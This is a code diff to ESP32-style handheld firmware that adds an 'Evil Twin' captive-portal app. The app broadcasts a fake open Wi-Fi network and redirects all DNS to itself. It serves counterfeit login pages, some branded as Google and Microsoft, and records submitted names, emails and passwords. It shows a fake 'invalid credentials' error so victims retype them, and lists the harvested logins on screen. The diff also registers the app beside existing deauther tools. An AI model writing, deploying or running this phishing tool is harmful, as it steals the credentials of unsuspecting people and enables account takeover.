@@ -4,8 +4,12 @@
 #include "eeprom.h"
 #include "keyboard.h"
 #include "utils.h"
+#include "controls.h"
 #include <WiFi.h>
 #include <esp_wifi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <LittleFS.h>
 #include <vector>
 #include <string.h>
 
@@ -690,12 +694,343 @@ CPP_APP(wifi_settings) {
 
 REGISTER_CPP_APP(wifi_settings, "/Settings/WiFi");
 
+// Captive Portal - Evil Twin with fake login pages
+static WebServer* portalServer = nullptr;
+static DNSServer* dnsServer = nullptr;
+static std::vector<String> capturedCreds;
+static bool portalRunning = false;
+
+String readHTMLFile(const char* path) {
+    if (!LittleFS.exists(path)) {
+        Serial.printf("HTML file not found: %s\n", path);
+        return "<html><body><h1>File not found</h1></body></html>";
+    }
+    
+    File file = LittleFS.open(path, "r");
+    if (!file) {
+        Serial.printf("Failed to open: %s\n", path);
+        return "<html><body><h1>Error opening file</h1></body></html>";
+    }
+    
+    String content = file.readString();
+    file.close();
+    return content;
+}
+
+void handleRoot() {
+    if (!portalServer) {
+        return;
+    }
+    
+    if (portalServer->uri() == "/") {
+        portalServer->send(200, "text/html", readHTMLFile("/assets/captive_login.html"));
+    } else if (portalServer->uri() == "/register") {
+        portalServer->send(200, "text/html", readHTMLFile("/assets/captive_register.html"));
+    } else if (portalServer->uri() == "/google") {
+        portalServer->send(200, "text/html", readHTMLFile("/assets/captive_google.html"));
+    } else if (portalServer->uri() == "/microsoft") {
+        portalServer->send(200, "text/html", readHTMLFile("/assets/captive_microsoft.html"));
+    } else {
+        // Captive portal detection or unknown - redirect to login
+        portalServer->sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+        portalServer->sendHeader("Pragma", "no-cache");
+        portalServer->sendHeader("Expires", "-1");
+        portalServer->send(200, "text/html", readHTMLFile("/assets/captive_login.html"));
+    }
+}
+
+void handlePost() {
+    if (!portalServer) {
+        return;
+    }
+    
+    String creds = "";
+    
+    if (portalServer->hasArg("name")) creds += "Name: " + portalServer->arg("name") + "\n";
+    if (portalServer->hasArg("email")) creds += "Email: " + portalServer->arg("email") + "\n";
+    if (portalServer->hasArg("password")) creds += "Pass: " + portalServer->arg("password") + "\n";
+    if (portalServer->hasArg("confirm")) creds += "Confirm: " + portalServer->arg("confirm") + "\n";
+    
+    if (creds.length() > 0) {
+        capturedCreds.push_back(creds);
+        Serial.println("Captured:");
+        Serial.println(creds);
+    }
+    
+    // Redirect back to login with fake "try again" message
+    portalServer->send(200, "text/html", 
+        "<html><body><h2>Connection Error</h2><p>Invalid credentials. Please try again.</p>"
+        "<a href='/'>Back to Login</a></body></html>");
+}
+
+CPP_APP(captive_portal) {
+    char ssid[64] = "Free WiFi";
+    
+    // Get custom SSID from keyboard
+    CppApp::clear();
+    CppApp::println("Captive Portal");
+    CppApp::println("");
+    CppApp::println("Enter SSID:");
+    CppApp::println("");
+    CppApp::println("Btn: Continue");
+    CppApp::refresh();
+    CppApp::waitFrame(1000);
+    
+    if (!showKeyboard("Enter SSID", ssid, sizeof(ssid))) {
+        Serial.println("Captive Portal: Canceled");
+        return;
+    }
+    
+    Serial.printf("Captive Portal: Starting with SSID '%s'\n", ssid);
+    
+    // Stop any existing portal
+    if (portalRunning) {
+        if (portalServer) {
+            portalServer->stop();
+            delete portalServer;
+            portalServer = nullptr;
+        }
+        if (dnsServer) {
+            dnsServer->stop();
+            delete dnsServer;
+            dnsServer = nullptr;
+        }
+        WiFi.softAPdisconnect(true);
+        portalRunning = false;
+    }
+    
+    capturedCreds.clear();
+    
+    // Start Access Point
+    WiFi.mode(WIFI_AP);
+    bool apStarted = WiFi.softAP(ssid);
+    
+    if (!apStarted) {
+        Serial.println("Captive Portal: Failed to start AP");
+        CppApp::clear();
+        CppApp::println("Captive Portal");
+        CppApp::println("Failed to start!");
+        CppApp::refresh();
+        CppApp::waitFrame(2000);
+        return;
+    }
+    
+    // Wait for AP to be fully initialized
+    delay(500);
+    
+    IPAddress apIP = WiFi.softAPIP();
+    if (apIP == IPAddress(0, 0, 0, 0)) {
+        Serial.println("Captive Portal: AP IP not assigned");
+        CppApp::clear();
+        CppApp::println("Captive Portal");
+        CppApp::println("AP init failed!");
+        CppApp::refresh();
+        CppApp::waitFrame(2000);
+        WiFi.softAPdisconnect(true);
+        return;
+    }
+    
+    Serial.printf("Captive Portal: AP started, IP: %s\n", apIP.toString().c_str());
+    
+    // Start DNS server (redirect all domains to us)
+    dnsServer = new DNSServer();
+    if (!dnsServer) {
+        Serial.println("Captive Portal: Failed to create DNS server");
+        WiFi.softAPdisconnect(true);
+        return;
+    }
+    dnsServer->start(53, "*", apIP);
+    
+    // Start web server with minimal handlers to save memory
+    portalServer = new WebServer(80);
+    if (!portalServer) {
+        Serial.println("Captive Portal: Failed to create Web server");
+        if (dnsServer) {
+            dnsServer->stop();
+            delete dnsServer;
+            dnsServer = nullptr;
+        }
+        WiFi.softAPdisconnect(true);
+        return;
+    }
+    portalServer->on("/post", HTTP_POST, handlePost);
+    portalServer->onNotFound(handleRoot); // All requests go through handleRoot for routing
+    portalServer->begin();
+    
+    portalRunning = true;
+    
+    bool needsRender = true;
+    unsigned long lastCredCount = 0;
+    
+    while (!CppApp::shouldExit()) {
+        updateControls();
+        
+        if (isLeftPressed()) {
+            break;
+        }
+        
+        // Handle DNS and HTTP requests
+        if (dnsServer) {
+            dnsServer->processNextRequest();
+        }
+        if (portalServer) {
+            portalServer->handleClient();
+        }
+        
+        // Update display only when credentials captured
+        if (capturedCreds.size() != lastCredCount) {
+            lastCredCount = capturedCreds.size();
+            needsRender = true;
+        }
+        
+        if (needsRender) {
+            CppApp::clear();
+            CppApp::println("Captive Portal");
+            CppApp::println("Running");
+            CppApp::println("");
+            
+            // Show SSID (truncate if too long)
+            String ssidLine = String(ssid);
+            if (ssidLine.length() > 21) {
+                ssidLine = ssidLine.substring(0, 18) + "...";
+            }
+            CppApp::println(ssidLine.c_str());
+            CppApp::println("");
+            
+            char buf[32];
+            snprintf(buf, sizeof(buf), "Captured: %d", capturedCreds.size());
+            CppApp::println(buf);
+            
+            // Show last credential if any
+            if (capturedCreds.size() > 0) {
+                CppApp::println("");
+                String last = capturedCreds[capturedCreds.size() - 1];
+                
+                // Parse and display each line with wrapping
+                int startPos = 0;
+                int lineCount = 0;
+                while (startPos < (int)last.length() && lineCount < 2) {
+                    int newlinePos = last.indexOf('\n', startPos);
+                    if (newlinePos < 0) newlinePos = last.length();
+                    
+                    String line = last.substring(startPos, newlinePos);
+                    if (line.length() > 21) {
+                        line = line.substring(0, 18) + "...";
+                    }
+                    CppApp::println(line.c_str());
+                    lineCount++;
+                    startPos = newlinePos + 1;
+                }
+            } else {
+                CppApp::println("");
+                CppApp::println("Waiting...");
+            }
+            
+            CppApp::println("");
+            CppApp::println("L: Exit");
+            CppApp::refresh();
+            needsRender = false;
+        }
+        
+        delay(50);
+    }
+    
+    // Cleanup
+    Serial.println("Captive Portal: Stopping");
+    if (portalServer) {
+        portalServer->stop();
+        delete portalServer;
+        portalServer = nullptr;
+    }
+    if (dnsServer) {
+        dnsServer->stop();
+        delete dnsServer;
+        dnsServer = nullptr;
+    }
+    WiFi.softAPdisconnect(true);
+    portalRunning = false;
+    
+    // Show captured credentials - only update display when navigating
+    if (capturedCreds.size() > 0) {
+        int viewIndex = 0;
+        bool viewing = true;
+        bool needsCredRender = true;
+        
+        while (viewing && !CppApp::shouldExit()) {
+            updateControls();
+            
+            // Only render when navigating (index changed) or first time
+            bool hadNavigation = false;
+            if (isUpPressed() && viewIndex > 0) {
+                viewIndex--;
+                needsCredRender = true;
+                hadNavigation = true;
+                delay(200);
+            }
+            if (isDownPressed() && viewIndex < capturedCreds.size() - 1) {
+                viewIndex++;
+                needsCredRender = true;
+                hadNavigation = true;
+                delay(200);
+            }
+            if (isLeftPressed()) {
+                viewing = false;
+                break;
+            }
+            
+            // Only render when needed (navigation or first time)
+            if (needsCredRender) {
+                CppApp::clear();
+                CppApp::println("Captured Creds");
+                
+                char buf[32];
+                snprintf(buf, sizeof(buf), "[%d/%d]", viewIndex + 1, (int)capturedCreds.size());
+                CppApp::println(buf);
+                CppApp::println("");
+                
+                // Show credential (word wrap)
+                String cred = capturedCreds[viewIndex];
+                int start = 0;
+                int maxLines = 5;
+                int lineCount = 0;
+                
+                while (start < cred.length() && lineCount < maxLines) {
+                    int end = cred.indexOf('\n', start);
+                    if (end == -1) end = cred.length();
+                    
+                    String line = cred.substring(start, end);
+                    if (line.length() > 21) {
+                        CppApp::println(line.substring(0, 21).c_str());
+                    } else {
+                        CppApp::println(line.c_str());
+                    }
+                    
+                    start = end + 1;
+                    lineCount++;
+                }
+                
+                CppApp::println("");
+                CppApp::println("U/D:Nav L:Exit");
+                CppApp::refresh();
+                needsCredRender = false;
+            }
+            
+            delay(50);
+        }
+    }
+    
+    Serial.println("Captive Portal: Exiting");
+}
+
+REGISTER_CPP_APP(captive_portal, "/Applications/WiFi/Captive Portal");
+
 void registerWifiApps() {
 #if ENABLE_ADVANCED_WIFI
     registerCppApp("wifi_scanner", "/Applications/WiFi/Scanner", cppapp_wifi_scanner);
     registerCppApp("wifi_deauther", "/Applications/WiFi/Deauther", cppapp_wifi_deauther);
     registerCppApp("wifi_rickroll", "/Applications/WiFi/Rickroll", cppapp_wifi_rickroll);
     registerCppApp("wifi_combo", "/Applications/WiFi/Deauth+Rick", cppapp_wifi_combo);
+    registerCppApp("captive_portal", "/Applications/WiFi/Captive Portal", cppapp_captive_portal);
     registerCppApp("wifi_settings", "/Settings/WiFi", cppapp_wifi_settings);
 #endif
 }
